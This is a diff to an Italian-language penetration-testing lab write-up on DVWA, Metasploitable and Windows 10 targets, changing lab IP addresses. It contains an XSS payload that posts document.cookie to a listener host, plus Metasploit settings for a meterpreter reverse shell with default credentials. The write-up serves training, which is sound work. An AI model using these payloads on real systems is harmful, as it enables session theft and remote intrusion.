@@ -85,7 +85,7 @@ Simulare il furto di cookie di sessione sfruttando vulnerabilità XSS.
    - URL: `http://192.168.13.150/dvwa/vulnerabilities/xss_r/`
 3. Inserisci il seguente payload:
    ```html
-   <img src="nonexistent.jpg" onerror="fetch('http://192.168.50.165:4444', {method: 'POST', body: document.cookie})">
+   <img src="nonexistent.jpg" onerror="fetch('http://192.168.50.100:4444', {method: 'POST', body: document.cookie})">
    ```
 4. Verifica i cookie ricevuti nel terminale di Kali Linux.
 
@@ -154,7 +154,7 @@ Sulla macchina Metasploitable sono stati individuati diversi servizi in ascolto 
 - **Accesso all'interfaccia web**: `https://localhost:8834`
 - **Creazione della scansione**:
   - Tipo: Basic Network Scan
-  - Target: 192.168.50.3
+  - Target: 192.168.13.150
 - **Esecuzione dello scan**:
   - La scansione ha identificato una vulnerabilità critica sul servizio Samba in ascolto sulla porta 445 TCP.
 - **Report allegato**:
@@ -195,7 +195,7 @@ Sulla macchina Metasploitable sono stati individuati diversi servizi in ascolto 
   ```bash
   ifconfig
   ```
-  - Risultato: Confermato l'indirizzo IP della macchina vittima: `192.168.50.3`.
+  - Risultato: Confermato l'indirizzo IP della macchina vittima: `192.168.13.150
 
 ### ✅ Conclusioni
 
@@ -270,7 +270,7 @@ Sulla macchina Windows 10 ci sono servizi che possono essere sfruttati per otten
   set HttpUsername admin
   set HttpPassword password
   set payload java/meterpreter/reverse_tcp
-  set LHOST 192.168.13.151
+  set LHOST 192.168.13.100
   set LPORT 7777
   ```
 - **Lanciare l'exploit**:
